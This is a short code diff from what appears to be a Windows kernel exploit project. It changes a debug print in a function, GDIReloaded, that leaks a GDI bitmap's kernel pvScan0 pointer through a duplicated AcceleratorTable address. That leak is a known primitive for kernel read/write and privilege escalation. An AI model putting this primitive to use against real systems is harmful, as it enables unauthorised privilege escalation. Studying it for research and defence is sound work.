@@ -127,7 +127,7 @@ LeakBitmapInfo GDIReloaded(LPCWSTR lpBitmapName, DWORD dwOffsetToPvScan0)
 	BitmapInfo.pBitmapPvScan0 = pAcceleratorAddrA + dwOffsetToPvScan0;
 	wprintf(L" [+] Duplicate AcceleratorTable Address: 0x%p \n", pAcceleratorAddrA);
 	wprintf(L" [+] %ls Bitmap Handle at: 0x%08x \n", lpBitmapName, (ULONG)BitmapInfo.hBitmap);
-	wprintf(L" [+] Worker Bitmap pvScan0 Pointer: 0x%p \n\n", BitmapInfo.pBitmapPvScan0);
+	wprintf(L" [+] %ls Bitmap pvScan0 Pointer: 0x%p \n\n", lpBitmapName, BitmapInfo.pBitmapPvScan0);
 
 	return BitmapInfo;
 }
